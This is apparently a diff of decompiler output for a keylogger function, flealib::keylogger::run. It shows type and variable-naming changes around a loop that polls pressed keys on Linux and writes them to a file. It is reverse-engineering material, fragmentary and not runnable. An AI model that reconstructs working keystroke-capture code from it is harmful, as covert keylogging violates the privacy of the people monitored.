@@ -11,7 +11,7 @@ fn flealib::keylogger::run(a0: i64, a1: u64) -> int {
     let v9: u64;  // [bp-0xf8]
     let v10: u32;  // [bp-0xf0]
     let v11: u8;  // [bp-0xee]
-    let v12: u16;  // [bp-0xec]
+    let v12: u8;  // [bp-0xec]
     let v13: u64;  // [bp-0xe8]
     let v14: core::fmt::rt::Argument;  // [bp-0xc8], Other Possible Types: core::result::Result<std::fs::File, std::io::error::Error>, struct24
     let v15: struct88;  // [bp-0xc8]
@@ -21,11 +21,10 @@ fn flealib::keylogger::run(a0: i64, a1: u64) -> int {
     let v20: Result<struct4, struct8>;  // [bp-0x98], Other Possible Types: struct42
     let v21: core::fmt::rt::Argument;  // [bp-0x50]
     let v22: struct88;  // [bp-0x50]
-    let v23: struct12;  // [bp-0x40]
+    let v23: struct16;  // [bp-0x40]
     let v25: u64;  // rcx
-    let v27: struct32;  // rax
-    let v28: u32;  // rdx
-    let v30: i64;  // rax
+    let v27: u32;  // rdx
+    let v29: i64;  // rax
 
     v5 = a1;
     v16 = a0;
@@ -61,8 +60,7 @@ fn flealib::keylogger::run(a0: i64, a1: u64) -> int {
     core::result::Result<T,E>::expect(std::io::Write::write_fmt(&v0, &v8), "flealib/src/keylogger.rs");
     loop {
         <device_query::device_state::linux::DeviceState as device_query::device_query::DeviceQuery>::get_keys(&v9, &v6);
-        v27 = <alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(1, v4);
-        if !<[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v8.pieces.len, v13, v27, v28) && v13 {
+        if !<[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v8.pieces.len, v13, <alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(1, v4), v27) && v13 {
             v14 = core::fmt::rt::Argument {
                 ty: &v9
             };
@@ -78,8 +76,8 @@ fn flealib::keylogger::run(a0: i64, a1: u64) -> int {
         v4 = v20;
         v1 = v19;
         std::sync::mutex::Mutex<T>::lock(&v19, v5 + 16);
-        v30 = core::result::Result<T,E>::unwrap(&v19);
-        if *((v30 + 5) as &i8) {
+        v29 = core::result::Result<T,E>::unwrap(&v19);
+        if *((v29 + 5) as &i8) {
             break;
         }
         std::thread::sleep(None, &g_989680);
